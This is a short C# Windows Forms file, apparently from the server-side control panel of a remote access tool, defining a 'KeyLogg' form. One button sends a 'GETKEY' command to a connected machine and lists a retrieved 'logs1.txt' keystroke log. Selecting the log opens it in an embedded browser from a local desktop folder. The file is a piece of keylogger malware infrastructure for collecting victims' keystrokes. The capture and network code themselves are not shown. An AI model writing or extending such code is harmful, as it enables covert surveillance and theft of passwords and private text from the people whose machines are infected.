using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class KeyLogg : Form
    {
        public KeyLogg()
        {
            InitializeComponent();
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            Form1 f = new Form1();
            f.SendData("GETKEY|1@1");
            await Task.Delay(1000);           
            listBox1.Items.Add("logs1.txt");
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            string text = listBox1.GetItemText(listBox1.SelectedItem);
            webBrowser1.Navigate(@"C:\Users\tewni\Desktop\nain\" + text);
        }
    }
}
